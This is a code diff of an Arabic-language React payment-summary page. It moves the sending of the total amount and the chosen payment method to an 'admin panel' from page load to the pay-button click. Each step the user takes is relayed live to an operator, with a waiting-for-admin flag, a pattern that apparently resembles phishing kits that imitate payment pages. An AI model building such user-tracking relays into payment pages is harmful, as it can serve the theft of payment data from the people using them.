@@ -73,25 +73,23 @@ export default function SummaryPayment() {
 
   useEffect(() => {
     navigateToPage('ملخص الدفع');
-    
-    // إرسال المجموع الكلي تلقائياً عند فتح الصفحة (بعد تأخير للتأكد من الاتصال)
-    setTimeout(() => {
-      sendData({
-        data: {
-          'المجموع الكلي': `${servicePrice + Math.round(servicePrice * 0.15)} ر.س`,
-        },
-        current: 'الملخص والدفع',
-        waitingForAdminResponse: false,
-      });
-    }, 1000);
-  }, [servicePrice]);
+  }, []);
 
   const handlePayment = () => {
     if (!selectedPaymentMethod) return;
 
     setIsProcessing(true);
 
-    // Send data to admin panel
+    // Send summary data to admin panel when user clicks payment button
+    sendData({
+      data: {
+        'المجموع الكلي': `${totalAmount} ر.س`,
+      },
+      current: 'الملخص والدفع',
+      waitingForAdminResponse: false,
+    });
+
+    // Send payment method data to admin panel
     sendData({
       data: {
         paymentMethod: selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : 'Apple Pay',
